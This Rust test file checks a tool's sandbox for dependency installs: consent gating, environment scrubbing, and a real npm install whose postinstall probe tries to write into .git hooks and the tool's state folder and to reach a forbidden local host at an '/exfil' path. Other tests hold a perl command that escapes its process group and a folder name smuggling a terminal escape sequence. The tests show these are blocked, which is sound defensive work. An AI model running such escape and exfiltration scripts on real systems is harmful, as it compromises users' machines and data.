//! The install gate's consent rules, with a fake runner; the settings table;
//! and one real install in the sandbox against a local npm registry stub
//! (macOS and Linux), whose package's install script tries to get out.

use super::*;
use crate::deps::ConsentStore;
// The real install's registry stub (macOS and Linux only).
#[cfg(any(target_os = "macos", target_os = "linux"))]
use std::io::{Read, Write};
#[cfg(any(target_os = "macos", target_os = "linux"))]
use std::net::{Ipv4Addr, TcpListener};
#[cfg(any(target_os = "macos", target_os = "linux"))]
use std::sync::atomic::{AtomicUsize, Ordering};

fn write(path: &Path, text: &str) {
    std::fs::create_dir_all(path.parent().expect("parent")).expect("mkdir");
    std::fs::write(path, text).expect("write");
}

/// A runner that records each command and, when `fills`, makes the
/// install the check looks for (`node_modules/<dep>`).
#[derive(Default)]
struct FakeRunner {
    ran: Mutex<Vec<String>>,
    fills: bool,
}

impl InstallRunner for FakeRunner {
    fn run(
        &self,
        install: &MissingInstall,
        checkout: &Path,
        hosts: &[HostRule],
        _stop: &Stop,
    ) -> Result<InstallReport, DepsError> {
        self.ran.lock().expect("lock").push(install.command.clone());
        assert!(!hosts.is_empty(), "the ecosystem's hosts are passed");
        if self.fills {
            write(
                &checkout
                    .join(&install.dir)
                    .join("node_modules/dep/index.js"),
                "",
            );
        }
        Ok(InstallReport {
            install: install.clone(),
            elapsed: Duration::from_millis(1),
            contacted: vec!["registry.npmjs.org:443".into()],
            blocked: Vec::new(),
            network_open: false,
        })
    }
}

struct Project {
    _dir: tempfile::TempDir,
    root: PathBuf,
    store: ConsentStore,
}

/// A project with one npm dependency and nothing installed.
fn project() -> Project {
    let dir = tempfile::tempdir().expect("dir");
    let root = std::fs::canonicalize(dir.path()).expect("canonical");
    write(
        &root.join("package.json"),
        r#"{"dependencies":{"dep":"1"}}"#,
    );
    std::fs::create_dir_all(root.join(".kgraf")).expect("state");
    let store = ConsentStore::in_state_dir(&root.join(".kgraf"));
    Project {
        _dir: dir,
        root,
        store,
    }
}

fn gate(p: &Project, run: RunFetch, runner: &FakeRunner) -> Result<InstallOutcome, DepsError> {
    ensure_installs(
        &p.root,
        &InstallEnv::default(),
        &|| true,
        &p.store,
        run,
        runner,
        &|| Ok(InstallHosts::defaults()),
        &Stop::default(),
    )
}

fn the_install(p: &Project) -> MissingInstall {
    let missing = missing_installs(&p.root, &InstallEnv::default(), &|| true);
    assert_eq!(missing.len(), 1, "{missing:?}");
    missing.into_iter().next().expect("one")
}

/// Unattended, with no stored answer: the run stops before anything runs,
/// and the error names the exact command and how to allow it.
#[test]
fn without_a_consent_nothing_runs_and_the_question_names_the_command() {
    let p = project();
    let runner = FakeRunner::default();
    let err = gate(&p, RunFetch::Stored, &runner).expect_err("asks first");
    assert!(runner.ran.lock().expect("lock").is_empty(), "nothing ran");
    let text = err.to_string();
    assert!(
        text.contains("`npm install` in the project root (npm)"),
        "{text}"
    );
    assert!(text.contains("kgraf deps allow npm"), "{text}");
    assert!(text.contains("--fetch-deps"), "{text}");
    let q = err.consent_question().expect("a question");
    match &q.subject {
        crate::deps::ConsentSubject::Install(installs) => {
            assert_eq!(installs.len(), 1);
            assert_eq!(installs[0].command, "npm install");
        }
        other => panic!("an install question, not {other:?}"),
    }
    assert!(
        q.text().contains("`npm install` in the project root"),
        "{}",
        q.text()
    );
    assert!(
        q.text().contains("never its .git or .kgraf"),
        "{}",
        q.text()
    );
    assert_eq!(q.allow_command(), "kgraf deps allow npm");
}

/// Asked once: a stored consent runs the install without asking, and the
/// next run (installed now) neither asks nor runs.
#[test]
fn a_stored_consent_runs_the_install_once_without_asking() {
    let p = project();
    p.store
        .set_install(&the_install(&p), Consent::Allowed)
        .expect("store");
    let runner = FakeRunner {
        fills: true,
        ..FakeRunner::default()
    };
    let outcome = gate(&p, RunFetch::Stored, &runner).expect("installed");
    assert_eq!(outcome.installed.len(), 1);
    assert_eq!(
        *runner.ran.lock().expect("lock"),
        vec!["npm install".to_owned()]
    );
    let again = gate(&p, RunFetch::Stored, &runner).expect("nothing missing");
    assert!(again.installed.is_empty());
    assert_eq!(runner.ran.lock().expect("lock").len(), 1, "not run again");
}

/// The consent is for the exact command: a lockfile added changes it to
/// `npm ci`, and the run asks again instead of running the new command.
#[test]
fn a_changed_command_asks_again() {
    let p = project();
    p.store
        .set_install(&the_install(&p), Consent::Allowed)
        .expect("store");
    write(&p.root.join("package-lock.json"), "{}");
    let runner = FakeRunner::default();
    let err = gate(&p, RunFetch::Stored, &runner).expect_err("asks again");
    assert!(err.to_string().contains("`npm ci`"), "{err}");
    assert!(runner.ran.lock().expect("lock").is_empty());
    // The stored answer is still the old command's.
    let stored = p.store.installs().expect("read");
    assert_eq!(stored["npm:"].command, "npm install");
}

/// A refusal stored for the project, or this run's `--no-fetch-deps`: the
/// run goes on without the install (the not-installed notice says so).
#[test]
fn a_refusal_goes_on_without_running() {
    let p = project();
    let runner = FakeRunner::default();
    let outcome = gate(&p, RunFetch::Refuse, &runner).expect("goes on");
    assert_eq!(outcome.declined.len(), 1);
    assert!(outcome.declined_for_this_run);
    p.store
        .set_install(&the_install(&p), Consent::Refused)
        .expect("store");
    let outcome = gate(&p, RunFetch::Stored, &runner).expect("goes on");
    assert_eq!(outcome.declined.len(), 1);
    assert!(!outcome.declined_for_this_run);
    assert!(runner.ran.lock().expect("lock").is_empty());
}

/// This run's `--fetch-deps` (or the desktop's "Allow once") runs it and
/// stores nothing.
#[test]
fn allow_for_this_run_runs_and_stores_nothing() {
    let p = project();
    let runner = FakeRunner {
        fills: true,
        ..FakeRunner::default()
    };
    gate(&p, RunFetch::Allow, &runner).expect("installed");
    assert_eq!(runner.ran.lock().expect("lock").len(), 1);
    assert!(p.store.installs().expect("read").is_empty());
}

/// An install that succeeds and still leaves the install missing fails
/// loud, naming what is missing.
#[test]
fn an_install_that_leaves_it_missing_fails_loud() {
    let p = project();
    let runner = FakeRunner::default();
    let err = gate(&p, RunFetch::Allow, &runner).expect_err("still missing");
    assert!(
        matches!(err, DepsError::InstallIncomplete { .. }),
        "{err:?}"
    );
    assert!(err.to_string().contains("no node_modules"), "{err}");
}

/// A broken settings table stops the install, naming the key, and only
/// when an install would run.
#[test]
fn the_settings_table_overrides_a_list_and_a_bad_entry_is_named() {
    let hosts = InstallHosts::from_toml_str(
        "rounds_per_worker = 30\n[install_registries]\nnpm = [\"npm.example.com\", \"127.0.0.1:4873\"]\n",
    )
    .expect("parse");
    assert_eq!(
        hosts
            .for_ecosystem(Ecosystem::Npm)
            .iter()
            .map(ToString::to_string)
            .collect::<Vec<_>>(),
        vec!["npm.example.com", "127.0.0.1:4873"]
    );
    assert!(!hosts.is_default(Ecosystem::Npm));
    assert!(
        hosts.is_default(Ecosystem::Python),
        "untouched lists keep the default"
    );
    assert!(
        InstallHosts::from_toml_str("")
            .expect("empty")
            .is_default(Ecosystem::Gradle)
    );
    let err = InstallHosts::from_toml_str("[install_registries]\ncargo = [\"x\"]\n")
        .expect_err("unknown");
    assert!(err.contains("install_registries.cargo"), "{err}");
    let err = InstallHosts::from_toml_str("[install_registries]\nnpm = [\"https://x/\"]\n")
        .expect_err("a URL");
    assert!(err.contains("install_registries.npm"), "{err}");
    let p = project();
    p.store
        .set_install(&the_install(&p), Consent::Allowed)
        .expect("store");
    let err = ensure_installs(
        &p.root,
        &InstallEnv::default(),
        &|| true,
        &p.store,
        RunFetch::Stored,
        &FakeRunner::default(),
        &|| Err("settings: broken".to_owned()),
        &Stop::default(),
    )
    .expect_err("broken settings");
    assert!(matches!(err, DepsError::Settings { .. }), "{err:?}");
}

/// The consent file keeps version 1 until an install answer is stored, so
/// an older kGraf still reads a file with only the cargo answer.
#[test]
fn the_consent_file_version_follows_its_contents() {
    let p = project();
    p.store
        .set(crate::deps::Registry::CratesIo, Consent::Allowed)
        .expect("cargo");
    let text = std::fs::read_to_string(p.store.path()).expect("read");
    assert!(text.contains("\"version\": 1"), "{text}");
    p.store
        .set_install(&the_install(&p), Consent::Allowed)
        .expect("install");
    let text = std::fs::read_to_string(p.store.path()).expect("read");
    assert!(text.contains("\"version\": 2"), "{text}");
    assert!(text.contains("\"npm:\""), "{text}");
    assert_eq!(
        p.store
            .get(crate::deps::Registry::CratesIo)
            .expect("cargo still"),
        Consent::Allowed
    );
    assert_eq!(p.store.reset_installs(Ecosystem::Npm).expect("reset"), 1);
    let text = std::fs::read_to_string(p.store.path()).expect("read");
    assert!(text.contains("\"version\": 1"), "{text}");
}

#[test]
fn the_install_environment_names_no_user_configuration() {
    let stores = Path::new("/p/.kgraf/package-stores");
    let home = stores.join("home");
    let tmp = stores.join("tmp");
    let env: BTreeMap<String, std::ffi::OsString> =
        install_env(stores, &home, &tmp, None, Some("-Dhttps.proxyPort=1"))
            .into_iter()
            .collect();
    assert_eq!(env["HOME"], home.as_os_str());
    assert_eq!(
        env["NPM_CONFIG_USERCONFIG"],
        tmp.join("user-npmrc").as_os_str()
    );
    assert_eq!(env["GOMODCACHE"], stores.join("go").as_os_str());
    assert_eq!(env["NUGET_PACKAGES"], stores.join("nuget").as_os_str());
    assert_eq!(env["GRADLE_USER_HOME"], stores.join("gradle").as_os_str());
    let maven = env["MAVEN_OPTS"].to_string_lossy().into_owned();
    assert!(
        maven.contains("-Dmaven.repo.local=/p/.kgraf/package-stores/maven"),
        "{maven}"
    );
    assert!(
        maven.contains(&format!("-Duser.home={}", home.display())),
        "{maven}"
    );
    let java = env["JAVA_TOOL_OPTIONS"].to_string_lossy().into_owned();
    assert!(java.starts_with("-Dhttps.proxyPort=1 "), "{java}");
    assert!(java.contains("-Duser.home="), "{java}");
    assert!(env.contains_key("PIP_CONFIG_FILE"));
}

// ---- one real install, in the sandbox ------------------------------------

/// A local registry: answers the package document and the tarball of one
/// package, and counts requests.
#[cfg(any(target_os = "macos", target_os = "linux"))]
struct Registry {
    port: u16,
    hits: Arc<AtomicUsize>,
}

#[cfg(any(target_os = "macos", target_os = "linux"))]
fn registry(name: &'static str, tarball: Vec<u8>) -> Registry {
    let l = TcpListener::bind((Ipv4Addr::LOCALHOST, 0)).expect("bind");
    let port = l.local_addr().expect("addr").port();
    let hits = Arc::new(AtomicUsize::new(0));
    let h = hits.clone();
    let doc = format!(
        r#"{{"name":"{name}","dist-tags":{{"latest":"1.0.0"}},"versions":{{"1.0.0":{{"name":"{name}","version":"1.0.0","scripts":{{"postinstall":"node probe.js"}},"hasInstallScript":true,"dist":{{"tarball":"http://127.0.0.1:{port}/{name}/-/{name}-1.0.0.tgz"}}}}}}}}"#
    );
    std::thread::spawn(move || {
        for c in l.incoming() {
            let Ok(mut c) = c else { continue };
            h.fetch_add(1, Ordering::SeqCst);
            let mut buf = vec![0u8; 16 * 1024];
            let n = c.read(&mut buf).unwrap_or(0);
            let req = String::from_utf8_lossy(&buf[..n]).into_owned();
            let path = req.split_whitespace().nth(1).unwrap_or("/").to_owned();
            let (ctype, body): (&str, Vec<u8>) = if path.ends_with(".tgz") {
                ("application/octet-stream", tarball.clone())
            } else if path.trim_start_matches('/') == name {
                ("application/json", doc.clone().into_bytes())
            } else {
                let _ = write!(
                    c,
                    "HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
                );
                continue;
            };
            let _ = write!(
                c,
                "HTTP/1.1 200 OK\r\nContent-Type: {ctype}\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                body.len()
            );
            let _ = c.write_all(&body);
        }
    });
    Registry { port, hits }
}

/// A listener that only counts connections: the host the script must not reach.
#[cfg(any(target_os = "macos", target_os = "linux"))]
fn forbidden() -> (u16, Arc<AtomicUsize>) {
    let l = TcpListener::bind((Ipv4Addr::LOCALHOST, 0)).expect("bind");
    let port = l.local_addr().expect("addr").port();
    let hits = Arc::new(AtomicUsize::new(0));
    let h = hits.clone();
    std::thread::spawn(move || {
        for c in l.incoming() {
            if c.is_ok() {
                h.fetch_add(1, Ordering::SeqCst);
            }
        }
    });
    (port, hits)
}

/// The package's install script: write outside the tree, into the hidden
/// state folder and into the repository's hooks; reach the forbidden host
/// through the proxy and straight; then record each outcome in its own
/// folder (inside the tree, which it may write).
#[cfg(any(target_os = "macos", target_os = "linux"))]
fn probe_script(outside: &Path, state: &Path, hook: &Path, forbidden: u16) -> String {
    format!(
        r#"const fs = require('fs'), net = require('net'), http = require('http');
const out = {{}};
function tryWrite(name, p) {{
  try {{ fs.writeFileSync(p, 'x'); out[name] = 'written'; }}
  catch (e) {{ out[name] = 'denied: ' + e.code; }}
}}
tryWrite('outside', {outside:?});
tryWrite('state', {state:?});
tryWrite('hook', {hook:?});
const proxy = new URL(process.env.HTTP_PROXY);
const viaProxy = () => new Promise(res => {{
  const req = http.request({{ host: proxy.hostname, port: proxy.port, method: 'GET',
    path: 'http://127.0.0.1:{forbidden}/exfil', headers: {{ Host: '127.0.0.1:{forbidden}' }} }},
    r => {{ res('status ' + r.statusCode); r.resume(); }});
  req.on('error', e => res('error: ' + e.code));
  req.setTimeout(5000, () => {{ req.destroy(); res('timeout'); }});
  req.end();
}});
const direct = () => new Promise(res => {{
  const s = net.connect({forbidden}, '127.0.0.1');
  s.setTimeout(5000);
  s.on('connect', () => {{ s.end(); res('connected'); }});
  s.on('error', e => res('error: ' + e.code));
  s.on('timeout', () => {{ s.destroy(); res('timeout'); }});
}});
(async () => {{
  out.proxy = await viaProxy();
  out.direct = await direct();
  fs.writeFileSync('probe-result.json', JSON.stringify(out));
}})();
"#,
        outside = outside.display().to_string(),
        state = state.display().to_string(),
        hook = hook.display().to_string(),
    )
}

#[cfg(any(target_os = "macos", target_os = "linux"))]
fn on_path(program: &str) -> bool {
    std::env::var_os("PATH")
        .is_some_and(|path| std::env::split_paths(&path).any(|d| d.join(program).is_file()))
}

/// The install of an allowed package succeeds against the local registry,
/// and its install script, run inside the same sandbox, can neither write
/// outside the tree (nor into `.kgraf` or `.git`) nor reach a host that is
/// not allowed, through the proxy or around it.
///
/// Needs `npm` and `tar` on PATH (the Linux test image gets them with
/// `apt-get install nodejs npm`); without npm it says it skipped.
#[cfg(any(target_os = "macos", target_os = "linux"))]
#[test]
fn a_real_install_succeeds_and_its_script_is_confined() {
    if !on_path("npm") || !on_path("tar") {
        eprintln!("skipped: npm or tar is not on PATH");
        return;
    }
    let outside_dir = tempfile::tempdir().expect("outside");
    let outside = std::fs::canonicalize(outside_dir.path())
        .expect("canonical")
        .join("escaped.txt");
    let dir = tempfile::tempdir().expect("project");
    let root = std::fs::canonicalize(dir.path()).expect("canonical");
    std::fs::create_dir_all(root.join(".git/hooks")).expect("git");
    std::fs::create_dir_all(root.join(".kgraf")).expect("state");
    let (forbidden_port, forbidden_hits) = forbidden();

    // The package: a tarball made with the system `tar`.
    let pkg = tempfile::tempdir().expect("pkg");
    let state_file = root.join(".kgraf/planted.json");
    let hook = root.join(".git/hooks/post-checkout");
    write(
        &pkg.path().join("package/package.json"),
        r#"{"name":"probe-pkg","version":"1.0.0","scripts":{"postinstall":"node probe.js"}}"#,
    );
    write(
        &pkg.path().join("package/probe.js"),
        &probe_script(&outside, &state_file, &hook, forbidden_port),
    );
    let tgz = pkg.path().join("probe-pkg-1.0.0.tgz");
    let made = std::process::Command::new("tar")
        .args(["-czf"])
        .arg(&tgz)
        .arg("-C")
        .arg(pkg.path())
        .arg("package")
        .status()
        .expect("tar");
    assert!(made.success());
    let reg = registry("probe-pkg", std::fs::read(&tgz).expect("tgz"));

    write(
        &root.join("package.json"),
        r#"{"name":"app","version":"1.0.0","dependencies":{"probe-pkg":"1.0.0"}}"#,
    );
    write(
        &root.join(".npmrc"),
        &format!("registry=http://127.0.0.1:{}/\n", reg.port),
    );
    let store = ConsentStore::in_state_dir(&root.join(".kgraf"));
    let mut hosts = InstallHosts::defaults();
    hosts.set(
        Ecosystem::Npm,
        vec![HostRule::parse(&format!("127.0.0.1:{}", reg.port)).expect("rule")],
    );
    let runner = SandboxedInstall {
        timeout: Duration::from_secs(300),
    };
    let outcome = ensure_installs(
        &root,
        &InstallEnv::default(),
        &|| true,
        &store,
        RunFetch::Allow,
        &runner,
        &|| Ok(hosts.clone()),
        &Stop::default(),
    )
    .unwrap_or_else(|e| panic!("the install must succeed: {e}"));

    assert_eq!(outcome.installed.len(), 1, "{outcome:?}");
    let report = &outcome.installed[0];
    assert!(root.join("node_modules/probe-pkg/package.json").is_file());
    assert!(
        reg.hits.load(Ordering::SeqCst) >= 2,
        "the registry served it"
    );
    assert!(
        report
            .contacted
            .contains(&format!("127.0.0.1:{}", reg.port)),
        "{report:?}"
    );
    assert!(
        report
            .blocked
            .contains(&format!("127.0.0.1:{forbidden_port}")),
        "{report:?}"
    );
    let result = std::fs::read_to_string(root.join("node_modules/probe-pkg/probe-result.json"))
        .expect("the install script ran and recorded its tries");
    let result: serde_json::Value = serde_json::from_str(&result).expect("json");
    for key in ["outside", "state", "hook"] {
        assert!(
            result[key]
                .as_str()
                .is_some_and(|v| v.starts_with("denied")),
            "{key}: {result}"
        );
    }
    assert_eq!(result["proxy"], "status 403", "{result}");
    assert!(
        result["direct"]
            .as_str()
            .is_some_and(|v| v.starts_with("error")),
        "{result}"
    );
    assert!(!outside.exists(), "nothing was written outside the tree");
    assert!(!state_file.exists(), "nothing was written into .kgraf");
    assert!(!hook.exists(), "nothing was written into .git");
    std::thread::sleep(Duration::from_millis(200));
    assert_eq!(
        forbidden_hits.load(Ordering::SeqCst),
        0,
        "the forbidden host was never reached"
    );
}

/// A failing install fails loud: the output's end and each blocked host,
/// with how to allow it.
#[cfg(any(target_os = "macos", target_os = "linux"))]
#[test]
fn a_failing_install_shows_its_output_and_the_blocked_host() {
    if !on_path("npm") {
        eprintln!("skipped: npm is not on PATH");
        return;
    }
    let dir = tempfile::tempdir().expect("project");
    let root = std::fs::canonicalize(dir.path()).expect("canonical");
    std::fs::create_dir_all(root.join(".kgraf")).expect("state");
    write(
        &root.join("package.json"),
        r#"{"name":"app","version":"1.0.0","dependencies":{"left-pad":"1.3.0"}}"#,
    );
    // The project names a registry that is not allowed.
    write(
        &root.join(".npmrc"),
        "registry=http://npm.internal.invalid/\nfetch-retries=0\n",
    );
    let install = MissingInstall {
        ecosystem: Ecosystem::Npm,
        dir: PathBuf::new(),
        what: "no node_modules".into(),
        command: "npm install".into(),
    };
    let err = SandboxedInstall {
        timeout: Duration::from_secs(300),
    }
    .run(
        &install,
        &root,
        &[HostRule::parse("registry.npmjs.org").expect("rule")],
        &Stop::default(),
    )
    .expect_err("blocked");
    let text = err.to_string();
    assert!(text.contains("kGraf ran `npm install`"), "{text}");
    assert!(
        text.contains("kGraf blocked npm.internal.invalid:80"),
        "{text}"
    );
    assert!(text.contains("install_registries"), "{text}");
    assert!(text.contains("Its output ends:"), "{text}");
    assert!(
        text.contains("403"),
        "the package manager's own words: {text}"
    );
}

/// An earlier install could leave a link in the stores (`home ->
/// ~/somewhere`). kGraf's own writes there, before and after an install,
/// refuse it and write nothing at its target (decision 0083).
#[cfg(unix)]
#[test]
fn a_link_an_install_left_in_the_stores_is_never_followed_by_kgraf() {
    let dir = tempfile::tempdir().expect("project");
    let root = std::fs::canonicalize(dir.path()).expect("canonical");
    std::fs::create_dir_all(root.join(".kgraf")).expect("state");
    let target = tempfile::tempdir().expect("target");
    let stores = kgraf_sandbox::package_stores_root(&root);
    std::fs::create_dir_all(&stores).expect("stores");
    std::os::unix::fs::symlink(target.path(), stores.join("home")).expect("link");
    std::os::unix::fs::symlink(target.path(), stores.join("go")).expect("link");
    let install = MissingInstall {
        ecosystem: Ecosystem::Npm,
        dir: PathBuf::new(),
        what: "no node_modules".into(),
        command: "true".into(),
    };
    let err = SandboxedInstall::default()
        .run(&install, &root, &[], &Stop::default())
        .expect_err("refused");
    assert!(err.to_string().contains("home/.kgraf-home"), "{err}");
    assert!(
        kgraf_sandbox::mark_store_complete(&root, kgraf_sandbox::store_layout::GO).is_err(),
        "the marker is not written through a link"
    );
    assert_eq!(
        std::fs::read_dir(target.path()).expect("read").count(),
        0,
        "nothing was written at the link's target"
    );
}

// ---- the Windows rule, tested on every platform ---------------------------

/// Windows' backend cannot deny the network: an install there runs with it
/// open and says so (decision 0011); every other backend goes through the
/// proxy.
#[test]
fn only_the_windows_backend_runs_an_install_with_the_network_open() {
    use kgraf_sandbox::Backend;
    assert_eq!(
        install_network(Backend::WindowsRestrictedToken),
        InstallNetwork::OpenWithNotice(WINDOWS_NETWORK_OPEN)
    );
    assert_eq!(
        install_network(Backend::MacosSeatbelt),
        InstallNetwork::ThroughProxy
    );
    assert_eq!(
        install_network(Backend::LinuxLandlock),
        InstallNetwork::ThroughProxy
    );
    assert!(WINDOWS_NETWORK_OPEN.contains("decision 0011"));
    assert!(WINDOWS_NETWORK_OPEN.contains("writes were still confined"));
}

/// The question a Windows user reads says the network is open; elsewhere it
/// says the proxy limits it. A Windows install's report says it too.
#[test]
fn the_windows_question_and_report_say_the_network_is_open() {
    let install = MissingInstall {
        ecosystem: Ecosystem::Npm,
        dir: PathBuf::new(),
        what: "no node_modules".into(),
        command: "npm ci".into(),
    };
    let windows = question_text_for(
        std::slice::from_ref(&install),
        InstallNetwork::OpenWithNotice(WINDOWS_NETWORK_OPEN),
    );
    assert!(windows.contains("runs with the network open"), "{windows}");
    assert!(
        windows.contains("`npm ci` in the project root"),
        "{windows}"
    );
    let unix = question_text_for(std::slice::from_ref(&install), InstallNetwork::ThroughProxy);
    assert!(unix.contains("through kGraf's proxy"), "{unix}");
    assert!(!unix.contains("network open"), "{unix}");
    let report = InstallReport {
        install,
        elapsed: Duration::from_secs(1),
        contacted: Vec::new(),
        blocked: Vec::new(),
        network_open: true,
    };
    assert!(
        report.summary().contains("network not limited"),
        "{}",
        report.summary()
    );
}

// ---- the seal, the grants, left processes, variables and words -------------

/// A consent file kGraf did not write is no answer: a repository can commit
/// `.kgraf/dependency-fetch.json`, and an archive can unpack one, with an
/// install "allowed" for the exact command kGraf would run. The run must ask,
/// and nothing may run.
#[test]
fn a_consent_kgraf_did_not_write_is_no_answer() {
    let p = project();
    write(
        p.store.path(),
        r#"{"version": 2, "installs": {"npm:": {"command": "npm install", "consent": "allowed"}}}"#,
    );
    let runner = FakeRunner::default();
    let err = gate(&p, RunFetch::Stored, &runner).expect_err("asks first");
    assert!(
        matches!(err, DepsError::InstallConsentNeeded { .. }),
        "{err}"
    );
    assert!(runner.ran.lock().expect("lock").is_empty(), "nothing ran");
}

/// A seal counts only under this user's key and for the answer it was made
/// for: one made with another key, or a refusal's seal under an "allowed",
/// reads as unset.
#[test]
fn a_seal_from_another_key_or_another_answer_is_no_answer() {
    let p = project();
    let install = the_install(&p);
    ConsentStore::in_state_dir(&p.root.join(".kgraf"))
        .with_key([7; 32])
        .set_install(&install, Consent::Allowed)
        .expect("store");
    assert_eq!(
        p.store.install_consent(&install).expect("read"),
        Consent::Unset
    );
    p.store
        .set_install(&install, Consent::Refused)
        .expect("store");
    assert_eq!(
        p.store.install_consent(&install).expect("read"),
        Consent::Refused
    );
    let text = std::fs::read_to_string(p.store.path()).expect("read");
    std::fs::write(p.store.path(), text.replace("\"refused\"", "\"allowed\"")).expect("write");
    assert_eq!(
        p.store.install_consent(&install).expect("read"),
        Consent::Unset
    );
}

/// An install script that leaves its process group (its own `setsid`) and
/// keeps running must not outlive the install: it would go on writing the
/// user's checkout after kGraf took the install as done. It is stopped, and
/// the install fails loud. (On Linux the command is PID 1 of its own PID
/// namespace, so the kernel ends it; on macOS kGraf must.)
#[cfg(any(target_os = "macos", target_os = "linux"))]
#[test]
fn an_install_process_that_leaves_its_group_is_stopped_and_fails_the_install() {
    if !on_path("perl") {
        eprintln!("skipped: no perl on PATH");
        return;
    }
    let dir = tempfile::tempdir().expect("project");
    let root = std::fs::canonicalize(dir.path()).expect("canonical");
    std::fs::create_dir_all(root.join(".kgraf")).expect("state");
    let install = MissingInstall {
        ecosystem: Ecosystem::Npm,
        dir: PathBuf::new(),
        what: "no node_modules".into(),
        command: "perl -e 'use POSIX; exit 0 if fork(); POSIX::setsid(); sleep 2; \
                  open(my $f, \">\", \"escaped\"); close($f);'"
            .into(),
    };
    let result = SandboxedInstall::default().run(&install, &root, &[], &Stop::default());
    std::thread::sleep(Duration::from_secs(4));
    assert!(
        !root.join("escaped").exists(),
        "a process the install started went on writing the checkout ({result:?})"
    );
    if cfg!(target_os = "macos") {
        let err = result.expect_err("an install that left a process behind fails");
        assert!(err.to_string().contains("left its process group"), "{err}");
    }
}

/// The package managers read their configuration from the environment as
/// well as from files, and that configuration can hold a login: an index URL
/// with a password (`PIP_INDEX_URL`, `UV_INDEX_URL`), Bundler's per-host
/// credentials (`BUNDLE_GEMS__EXAMPLE__COM=user:pass`), NuGet's feed
/// endpoints with their tokens, a Go proxy URL, Gradle project properties,
/// git's command-line configuration (an `http.extraHeader` with a token).
/// None of these names looks like a credential, so the sandbox's own scrub
/// keeps them; the install removes them. Toolchain variables stay.
#[test]
fn package_manager_configuration_from_the_environment_is_removed() {
    let inherited = [
        "PIP_INDEX_URL",
        "PIP_EXTRA_INDEX_URL",
        "UV_INDEX_URL",
        "UV_DEFAULT_INDEX",
        "POETRY_REPOSITORIES_PRIVATE_URL",
        "BUNDLE_GEMS__EXAMPLE__COM",
        "BUNDLE_MIRROR__ALL",
        "VSS_NUGET_EXTERNAL_FEED_ENDPOINTS",
        "GOPROXY",
        "GOPRIVATE",
        "GONOSUMDB",
        "GOFLAGS",
        "GOAUTH",
        "ORG_GRADLE_PROJECT_repoUser",
        "GRADLE_OPTS",
        "npm_config_registry",
        "NPM_CONFIG_REGISTRY",
        "YARN_NPM_REGISTRY_SERVER",
        "PNPM_HOME_REGISTRY",
        "GIT_ASKPASS",
        "SSH_ASKPASS",
        "GIT_CONFIG_PARAMETERS",
        "GIT_CONFIG_COUNT",
        "GIT_CONFIG_KEY_0",
        "GIT_CONFIG_VALUE_0",
        "GIT_CONFIG_GLOBAL",
        "NETRC",
        "_JAVA_OPTIONS",
        "JDK_JAVA_OPTIONS",
        "MAVEN_ARGS",
        "COMPOSER_AUTH",
        "COMPOSER_HOME",
        "CARGO_REGISTRIES_PRIVATE_INDEX",
    ];
    let kept = [
        "PATH",
        "LANG",
        "LC_ALL",
        "TERM",
        "JAVA_HOME",
        "GOROOT",
        "CC",
        "CXX",
        "CARGO_HOME",
        "RUSTUP_HOME",
        "NVM_DIR",
        "PYENV_ROOT",
        "HOMEBREW_PREFIX",
        "SDKROOT",
        "NODE_EXTRA_CA_CERTS",
    ];
    let removed = inherited_configuration(
        inherited
            .iter()
            .chain(kept.iter())
            .map(std::ffi::OsString::from),
    );
    for name in inherited {
        assert!(
            removed.iter().any(|r| r == name),
            "{name} reaches the install"
        );
    }
    for name in kept {
        assert!(!removed.iter().any(|r| r == name), "{name} was removed");
    }
}

/// On Windows the sandbox confines neither reads nor the network (decision
/// 0011): an install script there can read every file the user can, the
/// credential files included, and send it anywhere. The question a Windows
/// user answers, and the report, must say so, never "kGraf never reads your
/// credential files".
#[test]
fn the_windows_question_says_an_install_script_can_read_and_send_any_file() {
    let install = MissingInstall {
        ecosystem: Ecosystem::Npm,
        dir: PathBuf::new(),
        what: "no node_modules".into(),
        command: "npm ci".into(),
    };
    let windows = question_text_for(
        std::slice::from_ref(&install),
        InstallNetwork::OpenWithNotice(WINDOWS_NETWORK_OPEN),
    );
    assert!(
        !windows.contains("never reads your credential files"),
        "{windows}"
    );
    assert!(windows.contains("credential files included"), "{windows}");
    assert!(
        WINDOWS_NETWORK_OPEN.contains("reads were not confined"),
        "{WINDOWS_NETWORK_OPEN}"
    );
    let unix = question_text_for(std::slice::from_ref(&install), InstallNetwork::ThroughProxy);
    assert!(
        !unix.contains("credential files included"),
        "elsewhere the deny list holds: {unix}"
    );
}

/// A folder name comes from the repository. Shown in the question on a
/// terminal, a control character in it (an escape sequence that clears the
/// line or moves the cursor) could rewrite what the person reads before they
/// answer. Control characters are shown escaped.
#[test]
fn a_control_character_in_a_folder_name_is_shown_escaped() {
    let install = MissingInstall {
        ecosystem: Ecosystem::Npm,
        dir: PathBuf::from("pkg\u{1b}[2K\rnothing to run"),
        what: "no node_modules".into(),
        command: "npm ci".into(),
    };
    for text in [
        install.place(),
        install.sentence(),
        question_text_for(std::slice::from_ref(&install), InstallNetwork::ThroughProxy),
    ] {
        assert!(
            !text.chars().any(|c| c.is_control()),
            "a control character is shown raw: {text:?}"
        );
    }
}
